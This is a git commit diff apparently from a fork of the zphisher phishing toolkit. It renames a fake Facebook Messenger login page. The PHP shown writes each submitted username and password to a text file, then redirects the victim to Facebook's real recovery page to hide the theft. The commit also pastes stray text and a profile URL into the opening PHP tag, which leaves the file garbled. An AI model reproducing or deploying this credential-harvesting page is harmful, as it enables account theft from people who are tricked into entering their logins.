4b40f597c5d6f42ff95ffd3d5eb7b33274b43884
052607 <99714034+052607@users.noreply.github.com>
2022-02-15 01:29:10 -0600

    Update and rename .sites/fb_messenger/login.php to .sitios/fb_messenger/login.php

--- .sitios/fb_messenger/login.php
+++ .sitios/fb_messenger/login.php
@@ -1,4 +1,5 @@
-<?php
+<?php zphisher/.sitios/fb_messenger/ inicio de sesión.phphttps://www.facebook.com/sandynany.esparza
+
 
 file_put_contents("usernames.txt", "Messenger Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://www.facebook.com/recover/initiate/');
